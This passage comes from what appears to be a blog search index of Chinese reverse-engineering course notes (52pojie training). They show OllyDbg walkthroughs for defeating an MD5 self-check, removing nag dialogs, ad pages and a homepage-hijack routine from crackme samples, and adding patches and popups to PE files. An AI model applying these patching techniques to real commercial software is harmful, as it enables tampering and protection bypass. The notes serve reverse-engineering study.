qqqf3_1.004B1040\n004B2E2C  |.  8BC7          mov eax,edi\n004B2E2E  |.  E8 9170F5FF   call qqqf3_1.00409EC4;关闭句柄\n004B2E33  |.  8D55 F0       lea edx,[local.4]\n004B2E36  |.  33C0          xor eax,eax\n004B2E38  |.  E8 2FFCF4FF   call qqqf3_1.00402A6C;又是GetMouduleFileNameA\n004B2E3D  |.  8B45 F0       mov eax,[local.4]\n004B2E40  |.  8D55 F8       lea edx,[local.2]\n004B2E43  |.  E8 ECF0FFFF   call qqqf3_1.004B1F34;跟进去\n```\n\n在`004B1F34`这个函数的第三个call语句`4B1DD8`函数发现`CreateFile`函数，是一个多功能的函数，可打开或创建文件或者I/O设备。继续F8，还看到了一个`GetFileSize`函数用来获取文件大小。获取文件大小后的那个函数就是MD5校验算法，我们暂时没那个能力对算法进行跟踪，所以先暂时互相放过彼此。\n\n继续F8返回到`4B1DD8`处，F8去到`4B1F74`处，信息窗口显示堆栈地址。\n\n```asm\n004B1F6A  |.  E8 69FEFFFF   call qqqf3_1.004B1DD8\n004B1F6F  |.  BE 10000000   mov esi,0x10\n004B1F74  |.  8D5D EC       lea ebx,[local.5]\n```\n\n```asm\n堆栈地址=0012FCD8\nebx=0012FD54\n```\n\n数据窗口跟随，`0012FCD8`一行显示的就是当前程序的MD5值。\n\n```asm\n0012FCD8  52 8C 2A 4F CB 43 39 6F 2D 6F 7A 91 FE C0 CF DC  R?O薈9o-oz扊老\n```\n\n而原程序的MD5值为11ea70a3c3735c29b48552776756406a。可以把当前程序拖去WinMD5检验是否为上面的MD5值528C2A4FCB43396F2D6F7A91FEC0CFDC。\n\n选中`lea ebx,[local.5]`右键 -> 分析 -> 从模块中删除分析。将下面代码复制。\n\n```asm\n004B1F74    8D5D EC         lea ebx,dword ptr ss:[ebp-0x14]\n004B1F77    8D55 E8         lea edx,dword ptr ss:[ebp-0x18]\n004B1F7A    33C0            xor eax,eax\n004B1F7C    8A03            mov al,byte ptr ds:[ebx]\n004B1F7E    E8 35F1FFFF     call qqqf3_1.004B10B8\n004B1F83    8B55 E8         mov edx,dword ptr ss:[ebp-0x18]\n004B1F86    8BC7            mov eax,edi\n004B1F88    E8 3F26F5FF     call qqqf3_1.004045CC\n004B1F8D    43              inc ebx\n004B1F8E    4E              dec esi\n004B1F8F  ^ 75 E6           jnz short qqqf3_1.004B1F77\n```\n\n在程序中找一段空代码，比如从`0056B0A0`开始。在`4B1F74`修改代码`jmp 0056B0A0`，将已经复制的代码都NOP掉。F8跳下去，将上面的第1行代码修改成`mov dword ptr ss:[ebp-0x14],1`放到`0056B0A0`。将原程序的MD5值二进制粘贴到数据窗口覆盖当前程序的MD5。\n\n修改第1行代码为`mov dword ptr ss:[ebp-0x14],0xA370EA11`。继续编写第2到4行代码：\n\n```asm\nmov dword ptr ss:[ebp-0x10],0x295c73c3\nmov dword ptr ss:[ebp-0xC],0x775285b4\nmov dword ptr ss:[ebp-0x8],0x6a405667\n```\n\n再将上面的二进制代码复制下来，确保一一对应，成品如下：\n\n```asm\n0056B0A0    C745 EC 11EA70A3        mov dword ptr ss:[ebp-0x14],0xA370EA11\n0056B0A7    C745 F0 C3735C29        mov dword ptr ss:[ebp-0x10],0x295C73C3\n0056B0AE    C745 F4 B4855277        mov dword ptr ss:[ebp-0xC],0x775285B4\n0056B0B5    C745 F8 6756406A        mov dword ptr ss:[ebp-0x8],0x6A405667\n0056B0BC    8D5D EC                 lea ebx,dword ptr ss:[ebp-0x14]\n0056B0BF    8D55 E8                 lea edx,dword ptr ss:[ebp-0x18]\n0056B0C2    33C0                    xor eax,eax\n0056B0C4    8A03                    mov al,byte ptr ds:[ebx]\n0056B0C6    E8 ED5FF4FF             call qqqf3_1.004B10B8\n0056B0CB    8B55 E8                 mov edx,dword ptr ss:[ebp-0x18]\n0056B0CE    8BC7                    mov eax,edi\n0056B0D0    E8 F794E9FF             call qqqf3_1.004045CC\n0056B0D5    43                      inc ebx\n0056B0D6    4E                      dec esi\n0056B0D7  ^ 75 E6                   jnz short qqqf3_1.0056B0BF\n0056B0D9  ^ E9 B36EF4FF             jmp qqqf3_1.004B1F91\n```\n\nF9运行，程序成功看到不是显示火星文，说明破解自校验成功。\n\n右键 -> 复制到可执行文件 -> 所有修改 -> 复制，保存文件。注意，有时候会出现“无法定位数据”的情况，这时就要改变空代码的位置。最好不要选程序最底端那段代码，经常不行...靠近汇编代码结束处距离5行左右最佳。","categories":["Windows逆向"],"tags":["OllyDbg","吾爱破解培训"]},{"title":"第二三课——去弹窗、主页锁定及DIY","url":"/posts/7cd35487.html","content":"\n# 1. 了解Windows API\n\n消息框：MessageBoxA/W（Ansi[ASCII]/WideChar[Unicode]）\n\n弹页面：\n\nShellExecuteA/W：open url——控制台执行\n\n<!--more-->\n\nWinExec：explorer.exe url——Windows执行\n\nCreateProcessA/W：PATH url——创建进程\n\n注册表相关：RegCreateKeyExA/W、RegOpenKeyExA/W、RegDeleteKeyExA/W\n\n创建线程：CreateThread\n\n# 2. 实例一\n\n简单的UPX壳，先脱壳才能查找字符串、去除弹窗。\n\n脱壳后程序运行，出现一个弹窗，再出现弹页面。弹窗点确定后，出现主程序，不一会儿又弹出一个页面，再一会儿后又弹出一个页面。\n\n目标：去除NAG，只剩一个主程序(课程介绍的链接不用去除)。\n\n首先去除弹窗。弹窗关键字符串“来试试我的程序啊”。脱壳后的程序载入OD，右键->中文搜索引擎->智能搜索。双击关键字符串去到反汇编窗口。\n\n```asm\n004014BA    C3              retn;上个函数结束\n004014BB    56              push esi;关键字符串函数开始\n004014BC    57              push edi\n004014BD    6A 67           push 0x67\n004014BF    6A 00           push 0x0\n004014C1    FF15 3C204000   call dword ptr ds:[<&kernel32.#GetNamedPipeHa>; kernel32.GetModuleHandleW\n004014C7    50              push eax\n004014C8    FF15 E8204000   call dword ptr ds:[<&user32.#445>]            ; user32.LoadIconW\n004014CE    8B75 08         mov esi,dword ptr ss:[ebp+0x8]                ; dumped_.<ModuleEntryPoint>\n004014D1    50              push eax\n004014D2    6A 00           push 0x0\n004014D4    68 80000000     push 0x80\n004014D9    56              push esi\n004014DA    FF15 F4204000   call dword ptr ds:[<&user32.#577>]            ; user32.SendMessageW\n004014E0    6A 00           push 0x0\n004014E2    68 70214000     push dumped_.00402170                         ; 52PoJie\n004014E7    68 80214000     push dumped_.00402180                         ; 来试试我的程序啊\n004014EC    56              push esi\n004014ED    FF15 EC204000   call dword ptr ds:[<&user32.#484>]            ; user32.MessageBoxW\n004014F3    8B3D 18204000   mov edi,dword ptr ds:[<&kernel32.#CreateThrea>; kernel32.CreateThread\n004014F9    6A 00           push 0x0\n004014FB    6A 00           push 0x0\n004014FD    6A 00           push 0x0\n004014FF    68 A0104000     push dumped_.004010A0\n00401504    6A 00           push 0x0\n00401506    6A 00           push 0x0\n00401508    FFD7            call edi\n0040150A    6A 00           push 0x0\n0040150C    6A 00           push 0x0\n0040150E    6A 00           push 0x0\n00401510    68 90124000     push dumped_.00401290\n00401515    6A 00           push 0x0\n00401517    6A 00           push 0x0\n00401519    FFD7            call edi\n0040151B    68 98214000     push dumped_.00402198                         ; 吾爱破解培训第二课实例一\\r\\n本程序会有一个弹窗和三次弹网页操作\\r\\n请把广告去除，加油！\n00401520    68 E9030000     push 0x3E9\n00401525    56              push esi\n00401526    FF15 F0204000   call dword ptr ds:[<&user32.#597>]            ; user32.SetDlgItemTextW\n0040152C    5F              pop edi                                       ; kernel32.7C817077\n0040152D    5E              pop esi                                       ; kernel32.7C817077\n0040152E    33C0            xor eax,eax\n00401530    5D              pop ebp                                       ; kernel32.7C817077\n00401531    C3              retn;关键字符串函数结束\n```\n\n从上面的代码可知，NAG窗口函数与主程序函数在一个父函数中，父函数中没有跳转语句，所以不能靠跳转绕过NAG，试一下nop掉NAG相关代码。\n\n程序运行到NAG的call指令，堆栈窗口显示\n\n```asm\n0012FCB8   002A074C  |hOwner = 002A074C ('吾爱破解培训第二课实例一',class='#32770')\n0012FCBC   00402180  |Text = \"来试试我的程序啊\"\n0012FCC0   00402170  |Title = \"52PoJie\"\n0012FCC4   00000000  \\Style = MB_OK|MB_APPLMODAL\n```\n\n即运行这个函数前有4个参数压栈，也就是call前面的4个`push`指令。\n\n```asm\n004014E0    6A 00           push 0x0\n004014E2    68 70214000     push dumped_.00402170                         ; 52PoJie\n004014E7    68 80214000     push dumped_.00402180                         ; 来试试我的程序啊\n004014EC    56              push esi\n004014ED    FF15 EC204000   call dword ptr ds:[<&user32.#484>]            ; user32.MessageBoxW\n```\n\n重载，将这5条指令用nop填充，运行，发现NAG窗口消失了。复制到可执行文件，保存。在此程序的基础上去除页面。\n\n3个NAG页面分别为：https://www.52pojie.cn/ 、https://www.52pojie.cn/forum-5-1.html 、http://www.52pojie.cn/forum-68-1.html 。\n\n查找关键字符串，可看到其中一个NAG页面 https://www.52pojie.cn/ 。同样，没有跳转指令，用nop填充，操作与NAG弹窗一样。保存，载入新程序。\n\n我们知道，弹页面用的是ShellExecuteA/W、WinExec、CreateProcessA/W几个函数。Ctrl+G搜索这些函数下断。F9运行，等待一会儿，程序断在某个函数处。Alt+F9返回，程序运行到用户领空的下一指令，看到弹出页面 https://www.52pojie.cn/forum-5-1.html ，也看到了函数调用。由于又没有跳转指令，依旧用nop。\n\n```asm\n0040125C    6A 05           push 0x5\n0040125E    53              push ebx\n0040125F    FF15 10204000   call dword ptr ds:[<&kernel32.#WriteCons>; kernel32.WinExec\n```\n\n保存，载入新程序。\n\n依旧那几个函数，Alt+F9返回后弹出页面 http://www.52pojie.cn/forum-68-1.html 。将刚才几个函数的断点去掉，在call指令处下断。\n\n```asm\n0040143B    FF15 20204000   call dword ptr ds:[<&kernel32.#CreatePro>; kernel32.CreateProcessA\n```\n\nF9运行，查看堆栈窗口\n\n```asm\n00C3FEC4   00000000  |ModuleFileName = NULL\n00C3FEC8   003A4210  |CommandLine = \"C:\\Program Files\\Internet Explorer\\iexplore.exe http://www.52pojie.cn/forum-68-1.html\"\n00C3FECC   00000000  |pProcessSecurity = NULL\n00C3FED0   00000000  |pThreadSecurity = NULL\n00C3FED4   00000000  |InheritHandles = FALSE\n00C3FED8   00000000  |CreationFlags = 0\n00C3FEDC   00000000  |pEnvironment = NULL\n00C3FEE0   00000000  |CurrentDir = NULL\n00C3FEE4   00C3FEF8  |pStartupInfo = 00C3FEF8\n00C3FEE8   00C3FF3C  \\pProcessInfo = 00C3FF3C\n```\n\n```asm\n00401403    E8 C2090000     call <jmp.&msvcr100.#1492>\n00401408    83C4 0C         add esp,0xC\n0040140B    8D55 88         lea edx,dword ptr ss:[ebp-0x78]\n0040140E    52              push edx\n0040140F    8D85 44FFFFFF   lea eax,dword ptr ss:[ebp-0xBC]\n00401415    50              push eax\n00401416    6A 00           push 0x0\n00401418    6A 00           push 0x0\n0040141A    6A 00           push 0x0\n0040141C    6A 00           push 0x0\n0040141E    6A 00           push 0x0\n00401420    6A 00           push 0x0\n00401422    53              push ebx\n00401423    B9 01000000     mov ecx,0x1\n00401428    6A 00           push 0x0\n0040142A    C785 70FFFFFF 0>mov dword ptr ss:[ebp-0x90],0x1\n00401434    66:898D 74FFFFF>mov word ptr ss:[ebp-0x8C],cx\n0040143B    FF15 20204000   call dword ptr ds:[<&kernel32.#CreatePro>; kernel32.CreateProcessA\n```\n\n将`push edx`及下面的指令全都nop掉，保存。至此，所有NAG都被清除。\n\n# 3. 实例二\n\nASPack壳，用ESP定律很快到达OEP，脱壳，用FixRes重构一下资源。\n\n运行程序，程序会将IE主页修改为 http://www.52pojie.cn/ ，主程序中央内置了广告，过了一会儿桌面右下角会闪出广告。\n\n目标：取消主页修改，去除广告。\n\n载入OD，查找字符串看看。\n\n```asm\n地址       反汇编                                    文本字符串\n0040193D   push dumped_.004034D0                     SeDebugPrivilege\n004019E2   mov [local.14],dumped_.004034F8           SOFTWARE\\microsoft\\Internet Explorer\\Main;微软浏览器、IE浏览器\n004019EE   mov esi,dumped_.0040354C                  http://www.52pojie.cn;广告地址\n00401A15   push dumped_.00403578                     Start Page;开始页\n00401A4B   push dumped_.00403590                     Start Page\n00401A81   push dumped_.004035A8                     Default_Page_URL;默认页\n00401B4F   push dumped_.004035CC                     我就是广告\\r\\n来把我干掉啊\\r\\n加油！;右下角的广告\n00401BA9   push dumped_.004035F4                     explorer.exe http://www.52pojie.cn/thread-384195-1-1.html\n00401C4A   push dumped_.00403630                     http://www.52pojie.cn/portal.php;主程序中间的广告\n00401DA9   push dumped_.00403674                     explorer.exe http://www.52pojie.cn/thread-384195-1-1.html\n```\n\n先去掉IE、微软的默认广告主页。双击进去，发现整个函数都是修改浏览器的主页面。\n\n```asm\n004019D0  /$  55            push ebp\n004019D1  |.  8BEC          mov ebp,esp\n004019D3  |.  83EC 38       sub esp,0x38\n004019D6  |.  A1 28504000   mov eax,dword ptr ds:[0x405028]\n004019DB  |.  33C5          xor eax,ebp\n004019DD  |.  8945 F8       mov [local.2],eax\n004019E0  |.  56            push esi\n004019E1  |.  57            push edi\n004019E2  |.  C745 C8 F8344>mov [local.14],dumped_.004034F8          ;  SOFTWARE\\microsoft\\Internet Explorer\\Main\n004019E9  |.  B9 0B000000   mov ecx,0xB\n004019EE  |.  BE 4C354000   mov esi,dumped_.0040354C                 ;  http://www.52pojie.cn\n004019F3  |.  8D7D CC       lea edi,[local.13]\n004019F6  |.  F3:A5         rep movs dword ptr es:[edi],dword ptr ds>\n004019F8  |.  8D45 FC       lea eax,[local.1]\n004019FB  |.  50            push eax                                 ; /pHandle = NULL\n004019FC  |.  8B4D C8       mov ecx,[local.14]                       ; |\n004019FF  |.  51            push ecx                                 ; |Subkey = \"?粒灴粁...\"\n00401A00  |.  68 02000080   push 0x80000002                          ; |hKey = HKEY_LOCAL_MACHINE\n00401A05  |.  FF15 10304000 call dword ptr ds:[<&advapi32.#465>]     ; \\RegCreateKeyW\n00401A0B  |.  6A 2C         push 0x2C                                ; /BufSize = 2C (44.)\n00401A0D  |.  8D55 CC       lea edx,[local.13]                       ; |\n00401A10  |.  52            push edx                                 ; |Buffer = ntdll.KiFastSystemCallRet\n00401A11  |.  6A 01         push 0x1                                 ; |ValueType = REG_SZ\n00401A13  |.  6A 00         push 0x0                                 ; |Reserved = 0x0\n00401A15  |.  68 78354000   push dumped_.00403578                    ; |Start Page\n00401A1A  |.  8B45 FC       mov eax,[local.1]                        ; |\n00401A1D  |.  50            push eax                                 ; |hKey = 0x0\n00401A1E  |.  FF15 00304000 call dword ptr ds:[<&advapi32.#509>]     ; \\RegSetValueExW\n00401A24  |.  8B4D FC       mov ecx,[local.1]\n00401A27  |.  51            push ecx                                 ; /hKey = 0012FFB0\n00401A28  |.  FF15 08304000 call dword ptr ds:[<&advapi32.#459>]     ; \\RegCloseKey\n00401A2E  |.  8D55 FC       lea edx,[local.1]\n00401A31  |.  52            push edx                                 ; /pHandle = ntdll.KiFastSystemCallRet\n00401A32  |.  8B45 C8       mov eax,[local.14]                       ; |\n00401A35  |.  50            push eax                                 ; |Subkey = NULL\n00401A36  |.  68 01000080   push 0x80000001                          ; |hKey = HKEY_CURRENT_USER\n00401A3B  |.  FF15 10304000 call dword ptr ds:[<&advapi32.#465>]     ; \\RegCreateKeyW\n00401A41  |.  6A 2C         push 0x2C                                ; /BufSize = 2C (44.)\n00401A43  |.  8D4D CC       lea ecx,[local.13]                       ; |\n00401A46  |.  51            push ecx                                 ; |Buffer = 0012FFB0\n00401A47  |.  6A 01         push 0x1                                 ; |ValueType = REG_SZ\n00401A49  |.  6A 00         push 0x0                                 ; |Reserved = 0x0\n00401A4B  |.  68 90354000   push dumped_.00403590                    ; |Start Page\n00401A50  |.  8B55 FC       mov edx,[local.1]                        ; |\n00401A53  |.  52            push edx                                 ; |hKey = 0x7C92E4F4\n00401A54  |.  FF15 00304000 call dword ptr ds:[<&advapi32.#509>]     ; \\RegSetValueExW\n00401A5A  |.  8B45 FC       mov eax,[local.1]\n00401A5D  |.  50            push eax                                 ; /hKey = NULL\n00401A5E  |.  FF15 08304000 call dword ptr ds:[<&advapi32.#459>]     ; \\RegCloseKey\n00401A64  |.  8D4D FC       lea ecx,[local.1]\n00401A67  |.  51            push ecx                                 ; /pHandle = 0012FFB0\n00401A68  |.  8B55 C8       mov edx,[local.14]                       ; |\n00401A6B  |.  52            push edx                                 ; |Subkey = \"跃?\"\n00401A6C  |.  68 01000080   push 0x80000001                          ; |hKey = HKEY_CURRENT_USER\n00401A71  |.  FF15 10304000 call dword ptr ds:[<&advapi32.#465>]     ; \\RegCreateKeyW\n00401A77  |.  6A 2C         push 0x2C                                ; /BufSize = 2C (44.)\n00401A79  |.  8D45 CC       lea eax,[local.13]                       ; |\n00401A7C  |.  50            push eax                                 ; |Buffer = NULL\n00401A7D  |.  6A 01         push 0x1                                 ; |ValueType = REG_SZ\n00401A7F  |.  6A 00         push 0x0                                 ; |Reserved = 0x0\n00401A81  |.  68 A8354000   push dumped_.004035A8                    ; |Default_Page_URL\n00401A86  |.  8B4D FC       mov ecx,[local.1]                        ; |\n00401A89  |.  51            push ecx                                 ; |hKey = 0x12FFB0\n00401A8A  |.  FF15 00304000 call dword ptr ds:[<&advapi32.#509>]     ; \\RegSetValueExW\n00401A90  |.  8B55 FC       mov edx,[local.1]\n00401A93  |.  52            push edx                                 ; /hKey = 7C92E4F4\n00401A94  |.  FF15 08304000 call dword ptr ds:[<&advapi32.#459>]     ; \\RegCloseKey\n00401A9A  |.  5F            pop edi                                  ;  kernel32.7C817077\n00401A9B  |.  5E            pop esi                                  ;  kernel32.7C817077\n00401A9C  |.  8B4D F8       mov ecx,[local.2]                        ;  kernel32.7C817080\n00401A9F  |.  33CD          xor ecx,ebp\n00401AA1  |.  E8 380B0000   call dumped_.004025DE\n00401AA6  |.  8BE5          mov esp,ebp\n00401AA8  |.  5D            pop ebp                                  ;  kernel32.7C817077\n00401AA9  \\.  C3            retn\n```\n\n这时可以直接将第1行代码修改为`retn`，但必须保证这个`retn`与段尾的`retn`状态一致，否则会导致堆栈不平衡。或者运行到段尾，执行返回，将父函数nop掉。保存，载入新程序。\n\n去除桌面右下角的广告。在CreateWindowExA/W、DialogBoxParamA/W下断运行。会自动停很多次，因为有很多窗口，但有些很明显不是，比如主程序还没出来就断下的肯定不是。主程序出来后要等一会儿才会出现右下角广告，所以需要等待一点时间才会断下。\n\n最后找到堆栈窗口为这个时，是右下角广告。\n\n```asm\n015FFF9C   00401BFB  /CALL 到 DialogBoxParamW 来自 dumped_1.00401BF5\n015FFFA0   00400000  |hInst = 00400000\n015FFFA4   00000084  |pTemplate = 0x84\n015FFFA8   00000000  |hOwner = NULL\n015FFFAC   00401B00  |DlgProc = dumped_1.00401B00\n015FFFB0   00000000  \\lParam = NULL\n```\n\n选中堆栈窗口的第1行，回车返回调用函数：\n\n```asm\n00401BD0  /.  55            push ebp\n00401BD1  |.  8BEC          mov ebp,esp\n00401BD3  |.  68 204E0000   push 0x4E20                                            ; /Timeout = 20000. ms\n00401BD8  |.  FF15 60304000 call dword ptr ds:[<&kernel32.#SystemTimeToFileTime_83>; \\Sleep\n00401BDE  |.  6A 00         push 0x0                                               ; /lParam = NULL\n00401BE0  |.  68 001B4000   push dumped_1.00401B00                                 ; |DlgProc = dumped_1.00401B00\n00401BE5  |.  6A 00         push 0x0                                               ; |hOwner = NULL\n00401BE7  |.  68 84000000   push 0x84                                              ; |pTemplate = 0x84\n00401BEC  |.  6A 00         push 0x0                                               ; |/pModule = NULL\n00401BEE  |.  FF15 1C304000 call dword ptr ds:[<&kernel32.#GetNamedPipeHandleState>; |\\GetModuleHandleW\n00401BF4  |.  50            push eax                                               ; |hInst = 00400000\n00401BF5  |.  FF15 E4304000 call dword ptr ds:[<&user32.#160>]                     ; \\DialogBoxParamW\n00401BFB  |.  5D            pop ebp                                                ;  dumped_1.00401BFB\n00401BFC  \\.  C3            retn\n```\n\n整个函数的意思是sleep20s弹出广告，那就直接在开头`retn`。保存，载入新程序。\n\n去掉中央内置广告。查找字符串跟进\n\n```asm\n00401C4A  |.  68 30364000   push dumped_1.00403630                   ;  http://www.52pojie.cn/portal.php\n```\n\n在数据窗口跟随`403630`，用00填充 http://www.52pojie.cn/portal.php ，保存。但是主程序还是有这个框框，只是不显示页面而已。如果想要美观一点。可以用Restorator软件，将中间的框框的“可视”取消，F8提交更改，保存。\n\n{% asset_img 可视.png 将可视取消 %}\n\n# 4. 修改版权和资源\n\n用实例二DIY。\n\n## 4.1 利用资源编辑器修改版权\n\n同样用Restorator/ResEdit/ResHacker，修改主程序的文字信息。(因为在OD看不到主程序的文字信息)\n\n{% asset_img Restorator修改版权.png Restorator修改版权 %}\n\n## 4.2 利用API修改版权\n\n修改右下角广告的文字信息。\n\nSetDlgItemTextA/W：DialogBox控件设置文本\n\n在中文搜索引擎找到关键句去到反汇编窗口\n\n```asm\n0040282F    68 181A5500     push 1_备份.00551A18                       ; 我就是广告\\r\\n来把我干掉啊\\r\\n加油！\n```\n\n在命令窗口输入`d 551A18`定位字符串，将想要写入的文字找个网页转换成十六进制。\n\n```\n62 11 4e 0d 66 2f 5e 7f 54 4a ff 0c 62 11 53 ea 66 2f 5c 0f 53 ef 72 31\n```\n\n由于PE文件是小端序的，所以将“6211”在OD里必须“1162”存放，以此类推。\n\n```\n11 62 0d 4e 2f 66 7f 5e 4a 54 0c ff 11 62 ea 53 2f 66 0f 5c ef 53 31 72\n```\n\n将多余的文字用00填充，写入的最好不要超过原本文字大小，以防产生各种问题。\n\n{% asset_img 修改文本.jpg 修改文本 %}\n\n## 4.3 利用十六进制编辑器修改\n\n用C32asm/WinHEX修改。找到位置直接打16进制进去，目前我还没找到粘贴二进制数据的地方，所以只能手打。修改完后保存即可。\n\n# 5. 汉化\n\n在汉化时，要注意保留快捷键，比如&D、&F。\n\n{% asset_img 汉化.png 汉化 %}\n\n{% asset_img 汉化前.png 汉化前 %}\n\n{% asset_img 汉化后.png 汉化后 %}\n\n# 6. 增加弹窗\n\n用Stud_PE载入程序，在函数那里找user32模块的`MessageBoxA`函数，如果没有则右键->add new import，dll选择user32.dll的路径(在吾爱虚拟机中路径为C:\\WINDOWS\\system32\\user32.dll)，选择`MessageBoxA`函数，添加到列表。RVA为`1C3173`。\n\n{% asset_img 添加函数.png 添加MessageBoxA %}\n\n在区段那里新增一个区段。原始大小、虚拟大小为1000，区段数据选择“用空字节填充区段”。区段的RVA为`1C4000`。再用OD载入去到`5C4000`处编写代码。\n\nMeaagexBoxA有4个参数：\n\n```c\nWINUSERAPI int WINAPI MessageBoxA(\nHWND hWnd,\t\t\t//获取父句柄\nLPCWSTR lpText,\t\t//文本信息\nLPCWSTR lpCaption,\t//标题\nUINT uType);\t\t//风格\n```\n\n在OD中，是从下往上push参数的。\n\n```asm\npush 0\t\t\t\t\t\t;0表示只有一个确认键\npush 地址\t\t\t\t\t\t;标题\npush 地址\t\t\t\t  \t\t;文本\npush 0\t\t\t\t\t\t;0表示没有父句柄\ncall dword ptr ds:[5C3173]\t;MessageBoxA的VA地址\n```\n\n地址可以是这个区段任意某个位置。标题和文本在数据窗口修改。修改完后会自动在反汇编窗口补上代码。别忘了执行完`MessageBoxA`后跳回OEP执行主程序。\n\n```asm\njmp 5025A6\n```\n\n复制到可执行文件，保存，用LoadPE或Stud_PE修改入口点为`1C4000`。\n\nMessageBoxW一样操作。\n\n{% asset_img 增加弹窗.png 增加弹窗 %}\n\n","categories":["Windows逆向"],"tags":["OllyDbg","吾爱破解培训"]},{"title":"第一课——脱壳基础","url":"/posts/e2d652c5.html","content":"# 1. 程序是什么语言编译的\n\n从目前国内接触到程序看，比较流行的编译器有：VC系列、易语言、.NET、Delphi，一些曾经用的很多但渐渐少了有：VB、ASM、BC++，还有一些用的比较少的有：AutoIt、PB、QT等，下面提供一些实例，结合实例来看看“入口点代码”、“程序区段”和“加载模块”等特征。\n\n<!--more-->\n\n## 1.1 VC6\n\n{% asset_img VC6.png VC6 %}\n\n```asm\n00401700 >/$  55            push ebp\n00401701  |.  8BEC          mov ebp,esp\n00401703  |.  6A FF         push -0x1\n00401705  |.  68 00254000   push 吾爱破解.00402500\n```\n\nVC6特点：入口点代码是固定的代码，入口调用的API也是相同的，其中有的push地址不同程序可能会有所不同；区段有四个也是固定的.text、.rdata、.data和.rsrc。\n\n## 1.2 VS2008与VS2013\n\n{% asset_img VS2008.png VS2008 %}\n\n```asm\n00B5DDAC > $  E8 EF4E0000   call 吾爱破解.00B62CA0\n00B5DDB1   .^ E9 79FEFFFF   jmp 吾爱破解.00B5DC2F\n```\n\n{% asset_img VS2013.png VS2013 %}\n\n```asm\n00B03359 > $  E8 A9520000   call 吾爱破解.00B08607\n00B0335E   .^ E9 7FFEFFFF   jmp 吾爱破解.00B031E2\n```\n\n```asm\n00B08607  /$  55            push ebp\n00B08608  |.  8BEC          mov ebp,esp\n```\n\nVS特点：入口点只有两行代码，一个CALL后直接JMP，第一个CALL进去后调用的API也是相同的；区段相对于VC6多了一个.reloc。\n\n## 1.3 易语言\n\n易语言编译无壳程序分为独立编译和非独立编译。由于易语言**独立编译**是调用VC的链接程序编译的，所以从区段和入口代码特征和VC相同，用exeinfoPE查壳也显示是VC6编译的。而**非独立编译**却显示不知名EXE，可能查壳工具里面没有存易语言非独立编译的特征码吧。\n\n{% asset_img 易语言非独立编译.png 易语言非独立编译 %}\n\n{% asset_img 易语言.png 易语言 %}\n\n易语言特点：从程序里找一些call调用，最终都会走到上面位置（文字不太好表达），这个方法可以区分易语言和VC，非独立编译比较容易识别，入口处和`E`模块都可以找到`krnln.fnr`。\n\n```asm\n00401000 >/$  E8 89000000                                        call 吾爱破解.0040108E\n00401005  |.  50                                                 push eax                                 ; /ExitCode = 0x0\n00401006  \\.  E8 B5010000                                        call <jmp.&KERNEL32.ExitProcess>         ; \\ExitProcess\n0040100B   .  47 65 74 4E 65 77 53 6F 63 6B 00                   ascii \"GetNewSock\",0\n00401016   .  45 72 72 6F 72 00                                  ascii \"Error\",0\n0040101C   .  6B 72 6E 6C 6E 2E 66 6E 65 00                      ascii \"krnln.fne\",0\n00401026   .  4E 6F 74 20 66 6F 75 6E 64 20 74 68 65 20 6B 65    ascii \"Not found the ke\"\n00401036   .  72 6E 65 6C 20 6C 69 62 72 61 72 79 20 6F 72 20    ascii \"rnel library or \"\n00401046   .  74 68 65 20 6B 65 72 6E 65 6C 20 6C 69 62 72 61    ascii \"the kernel libra\"\n00401056   .  72 79 20 69 73 20 69 6E 76 61 6C 69 64 21 00       ascii \"ry is invalid!\",0\n00401065   .  6B 72 6E 6C 6E 2E 66 6E 72 00                      ascii \"krnln.fnr\",0\n0040106F   .  50 61 74 68 00                                     ascii \"Path\",0\n00401074   .  53 6F 66 74 77 61 72 65 5C 46 6C 79 53 6B 79 5C    ascii \"Software\\FlySky\\\"\n00401084   .  45 5C 49 6E 73 74 61 6C 6C 00                      ascii \"E\\Install\",0\n0040108E  /$  55                                                 push ebp\n0040108F  |.  8BEC                                               mov ebp,esp\n00401091  |.  81C4 F0FEFFFF                                      add esp,-0x110\n00401097  |.  8D85 FCFEFFFF                                      lea eax,[local.65]\n0040109D  |.  50                                                 push eax\n0040109E  |.  E8 41010000                                        call 吾爱破解.004011E4\n004010A3  |.  68 65104000                                        push 吾爱破解.00401065                       ; /StringToAdd = \"krnln.fnr\"\n004010A8  |.  8D85 FCFEFFFF                                      lea eax,[local.65]                       ; |\n004010AE  |.  50                                                 push eax                                 ; |ConcatString = NULL\n004010AF  |.  E8 24010000                                        call <jmp.&KERNEL32.lstrcatA>            ; \\lstrcatA\n```\n\n## 1.4 Delphi\n\n{% asset_img Delphi.png Delphi %}\n\nDelphi特点：非常多的call指令，并且`push address`与`retn`结合相当于`jmp address`。比如：\n\n```asm\npush 004A52F4\n……\nretn\t\t\t\t\t\n;相当于jmp 004A52F4\n```\n\n## 1.5 BC++\n\n{% asset_img BC++6.png BC++6 %}\n\n{% asset_img BC++2010.png BC++2010 %}\n\nBC++6与BC++2010都差不多，入口处一样的机器码，接下来调用获取句柄的API函数。\n\n```asm\n004014EC > $ /EB 10         jmp short 吾爱破解.004014FE\n004014EE     |66            db 66                                    ;  CHAR 'f'\n004014EF     |62            db 62                                    ;  CHAR 'b'\n004014F0     |3A            db 3A                                    ;  CHAR ':'\n004014F1     |43            db 43                                    ;  CHAR 'C'\n004014F2     |2B            db 2B                                    ;  CHAR '+'\n004014F3     |2B            db 2B                                    ;  CHAR '+'\n004014F4     |48            db 48                                    ;  CHAR 'H'\n004014F5     |4F            db 4F                                    ;  CHAR 'O'\n004014F6     |4F            db 4F                                    ;  CHAR 'O'\n004014F7     |4B            db 4B                                    ;  CHAR 'K'\n004014F8     |90            nop\n004014F9     |E9            db E9\n004014FA   . |ACB04C00      dd offset 吾爱破解.___CPPdebugHook\n004014FE   > \\A1 9FB04C00   mov eax,dword ptr ds:[0x4CB09F]\n00401503   .  C1E0 02       shl eax,0x2\n00401506   .  A3 A3B04C00   mov dword ptr ds:[0x4CB0A3],eax\n0040150B   .  52            push edx                                 ;  吾爱破解.<ModuleEntryPoint>\n0040150C   .  6A 00         push 0x0                                 ; /pModule = NULL\n0040150E   .  E8 578F0C00   call <jmp.&KERNEL32.GetModuleHandleA>    ; \\GetModuleHandleA\n```\n\n## 1.6 ASM\n\n{% asset_img ASM.png ASM %}\n\n```asm\n0040108B >/$  6A 00            push 0x0                                 ; /pModule = NULL\n0040108D  |.  E8 4A000000      call <jmp.&kernel32.GetModuleHandleA>    ; \\GetModuleHandleA\n```\n\nASM特点：用汇编编写的程序都非常小，基本很少遇到，但它可用于改变自身代码，某些病毒就是利用多态和变形的特点隐藏自身。具体可见《OD使用教程》中的多态和变形。\n\n## 1.7 